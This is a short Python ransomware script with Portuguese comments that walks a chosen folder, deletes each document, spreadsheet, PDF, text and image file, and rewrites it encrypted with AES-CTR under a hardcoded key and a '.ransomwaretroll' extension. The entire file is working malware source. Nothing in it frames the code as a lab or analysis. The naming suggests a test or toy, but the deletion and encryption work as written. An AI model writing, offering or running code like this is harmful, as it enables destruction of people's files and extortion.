import os
import pyaes

# Lista de extensões a serem criptografadas
EXTENSOES = [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".jpg", ".png"]

# Função para criptografar um arquivo
def criptografar_arquivo(file_name, key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)

        # Criar objeto AES para criptografia
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar os dados do arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo criptografado: {file_name} -> {new_file_name}")
    except Exception as e:
        print(f"Erro ao criptografar {file_name}: {e}")

# Função para percorrer diretórios e criptografar arquivos
def criptografar_pasta(pasta, key):
    for raiz, _, arquivos in os.walk(pasta):
        for arquivo in arquivos:
            if any(arquivo.lower().endswith(ext) for ext in EXTENSOES):
                caminho_arquivo = os.path.join(raiz, arquivo)
                criptografar_arquivo(caminho_arquivo, key)

if __name__ == "__main__":
    # Caminho da pasta alvo
    pasta_alvo = input("Digite o caminho da pasta para criptografar os arquivos: ")

    if os.path.exists(pasta_alvo) and os.path.isdir(pasta_alvo):
        # Chave de criptografia (16 bytes)
        key = b"testeransomwares"  # Certifique-se de usar uma chave de tamanho adequado
        criptografar_pasta(pasta_alvo, key)
    else:
        print("Pasta inválida. Verifique o caminho e tente novamente.")
